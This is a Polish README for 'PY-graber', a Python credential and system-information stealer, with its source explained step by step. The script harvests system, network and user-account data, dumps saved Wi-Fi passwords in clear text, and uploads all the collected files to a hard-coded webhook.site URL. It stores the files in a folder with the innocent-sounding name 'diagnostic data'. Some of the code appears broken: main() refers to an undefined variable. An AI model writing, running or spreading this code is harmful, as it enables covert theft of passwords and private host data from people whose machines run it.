# PY-graber

#możliwości:
  -Zdobywa hasła do wifi
  -zdobywa dane z następujących komend:  systeminfo, ipconfig, ipconfig /all, Get-Proces, Get-WmiObject Win32_PhysicalMemory, netstat, Get-NetAdapter, Get-NetConnectionProfile, Get-WmiObject -Class Win32_LogicalDisk, Get-NetTCPConnection, Get-NetUDPEndpoint, Get-NetFirewallSetting | Select-Object, Get-WmiObject -Class Win32_UserAccount, netsh wlan show profile




1. **Importowanie bibliotek:**
   ```python
   import os
   import subprocess
   import requests
   ```
   - `os`: Moduł ten umożliwia interakcję z systemem operacyjnym, np. zarządzanie plikami i katalogami.
   - `subprocess`: Moduł ten pozwala na uruchamianie zewnętrznych poleceń i programów z poziomu Pythona.
   - `requests`: Moduł ten służy do wysyłania HTTP/1.1 zapytań, bardzo przydatny do komunikacji z serwerami webowymi.

2. **Stała:**
   ```python
   SCIEZKA_DO_FOLDERU = "C:\\dane_diagnostyczne"
   ```
   - Definiuje ścieżkę do folderu, w którym będą przechowywane pliki diagnostyczne.

3. **Funkcja `wyslij_plik_do_webhooka`:**
   ```python
   def wyslij_plik_do_webhooka(webhook_url, folder_path, file_name):
       file_path = os.path.join(folder_path, file_name)
       if os.path.exists(file_path):
           with open(file_path, 'rb') as file:
               file_data = file.read()
               files = {'file': (file_name, file_data)}
               response = requests.post(webhook_url, files=files)
   ```
   - Łączy ścieżkę folderu i nazwy pliku, aby uzyskać pełną ścieżkę do pliku.
   - Sprawdza, czy plik istnieje.
   - Jeśli plik istnieje, otwiera go i wysyła jego zawartość jako plik do podanego webhooka.

4. **Funkcja `czy_znaleziono_folder`:**
   ```python
   def czy_znaleziono_folder(sciezka):
       return os.path.exists(sciezka)
   ```
   - Sprawdza, czy dany folder istnieje i zwraca `True` lub `False`.

5. **Funkcja `lista_plikow_w_folderze`:**
   ```python
   def lista_plikow_w_folderze(folder_path):
       if os.path.exists(folder_path):
           files = os.listdir(folder_path)
           return files
       else:
           print(f'Folder {folder_path} nie istnieje.')
   ```
   - Sprawdza, czy folder istnieje.
   - Jeśli tak, zwraca listę plików w folderze.
   - Jeśli nie, drukuje komunikat o błędzie.

6. **Funkcja `usun_pliki_z_diagnozy`:**
   ```python
   def usun_pliki_z_diagnozy():
       if czy_znaleziono_folder(SCIEZKA_DO_FOLDERU):
           os.system("del /q C:\\dane_diagnostyczne\\*.txt")
           print("Pliki z diagnozy zostały usunięte.")
       else:
           print("Folder 'dane_diagnostyczne' nie został znaleziony lub nie ma w nim plików.")
   ```
   - Sprawdza, czy folder `SCIEZKA_DO_FOLDERU` istnieje.
   - Jeśli tak, usuwa wszystkie pliki `.txt` w tym folderze i drukuje komunikat.
   - Jeśli nie, drukuje komunikat o braku folderu.

7. **Funkcja `extract_wifi_profiles`:**
   ```python
   def extract_wifi_profiles(file_path):
       with open(file_path, 'r') as file:
           lines = file.readlines()

       profiles = []
       capture = False

       for line in lines:
           line = line.strip()
           if line == "User profiles":
               capture = True
           elif capture and line.startswith("All User Profile"):
               profile_name = line.split(":")[1].strip()
               profiles.append(profile_name)

       return profiles
   ```
   - Otwiera plik `file_path` i czyta jego zawartość.
   - Wyszukuje nazwy profili użytkowników Wi-Fi w pliku i zwraca je jako listę.

8. **Funkcja `uruchom_komende`:**
   ```python
   def uruchom_komende(komenda, nazwa_pliku):
       with open(nazwa_pliku, "w") as plik:
           subprocess.run(komenda, stdout=plik, stderr=subprocess.STDOUT, shell=True)
   ```
   - Uruchamia podane polecenie w wierszu poleceń i zapisuje wynik do pliku `nazwa_pliku`.

9. **Funkcja `run_powershell_command`:**
   ```python
   def run_powershell_command(command, output_file):
       powershell_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
       full_command = f'"{powershell_path}" -Command "{command}"'

       with open(output_file, "w") as output:
           subprocess.run(full_command, stdout=output, stderr=subprocess.STDOUT, shell=True)
   ```
   - Uruchamia podane polecenie PowerShell i zapisuje wynik do pliku `output_file`.

10. **Funkcja `main`:**
    ```python
    def main():
        if not czy_znaleziono_folder("c:\\dane_diagnostyczne"):
            os.mkdir("C:\\dane_diagnostyczne")

        usun_pliki_z_diagnozy()
        uruchom_komende("systeminfo", "C:\\dane_diagnostyczne\\info.txt")
        uruchom_komende("ipconfig", "C:\\dane_diagnostyczne\\ip.txt")
        uruchom_komende("ipconfig /all", "C:\\dane_diagnostyczne\\ip2.txt")
        run_powershell_command("Get-Process", "C:\\dane_diagnostyczne\\dane1.txt")
        run_powershell_command("Get-WmiObject Win32_PhysicalMemory", "C:\\dane_diagnostyczne\\dane2.txt")
        uruchom_komende("netstat", "C:\\dane_diagnostyczne\\net_test.txt")
        run_powershell_command("Get-NetAdapter", "C:\\dane_diagnostyczne\\kartysieciowe.txt")
        run_powershell_command("Get-NetConnectionProfile", "C:\\dane_diagnostyczne\\karty_bardziej_dokładnie.txt")
        run_powershell_command("Get-WmiObject -Class Win32_LogicalDisk", "C:\\dane_diagnostyczne\\dyski.txt")
        run_powershell_command("Get-NetTCPConnection", "C:\\dane_diagnostyczne\\ip3.txt")
        run_powershell_command("Get-NetUDPEndpoint", "C:\\dane_diagnostyczne\\ip4.txt")
        run_powershell_command("Get-NetFirewallSetting | Select-Object", "C:\\dane_diagnostyczne\\siec2.txt")
        run_powershell_command("Get-WmiObject -Class Win32_UserAccount", "C:\\dane_diagnostyczne\\użytkownicy.txt")
        run_powershell_command("netsh wlan show profile", "C:\\dane_diagnostyczne\\wifi.txt")
        wifi_profiles = extract_wifi_profiles(file_path)
        x = 0
        for wifi in wifi_profiles:
            run_powershell_command(f'netsh wlan show profile {wifi} key=clear', f'C:\\dane_diagnostyczne\\haslaDowiFI{x}.txt')
            x += 1
    ```
    - Sprawdza, czy folder `dane_diagnostyczne` istnieje, jeśli nie, tworzy go.
    - Usuwa wszystkie pliki diagnostyczne z folderu.
    - Uruchamia serię poleceń systemowych i PowerShell, zapisując wyniki do odpowiednich plików w folderze `dane_diagnostyczne`.
    - Wyszukuje profile Wi-Fi i zapisuje ich szczegóły do plików.

11. **Kod wykonywany po wywołaniu skryptu:**
    ```python
    if __name__ == "__main__":
        main()
        webhook_url = "https://webhook.site/23b24b8d-4ef3-4e73-b9ad-ed17749b1e0d"
        folder_path = "C:\\dane_diagnostyczne"
        nazwy_plikow = lista_plikow_w_folderze(folder_path)
        if nazwy_plikow:
            for nazwa_pliku in nazwy_plikow:
                wyslij_plik_do_webhooka(webhook_url, folder_path, nazwa_pliku)
    ```
    - Jeśli skrypt jest uruchomiony bezpośrednio, wywołuje funkcję `main`.
    - Następnie wysyła wszystkie pliki z folderu `dane_diagnostyczne` do określonego webhooka.
